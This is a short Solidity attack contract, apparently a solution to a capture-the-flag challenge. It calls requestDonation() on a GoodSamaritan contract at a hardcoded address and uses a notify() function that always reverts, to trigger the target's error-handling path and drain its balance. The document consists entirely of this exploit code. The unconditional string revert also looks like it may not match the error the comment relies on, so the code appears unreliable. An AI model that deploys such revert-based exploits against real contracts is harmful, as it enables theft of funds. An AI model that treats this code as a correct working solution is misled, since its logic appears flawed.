pragma solidity ^0.8.0;

interface GoodSamaritan {
    function requestDonation() external returns (bool);
}

contract RevertAttack {
    address payable public instanceAddress = payable(0xa16E02E87b7454126E5E10d957A927A7F5B5d2be);

    function exploit() external {
        GoodSamaritan(instanceAddress).requestDonation();
    }

    // Notify function will revert to trigger catch block
    function notify(uint256 amount) external {
        require(false, "Notify revert");
    }
}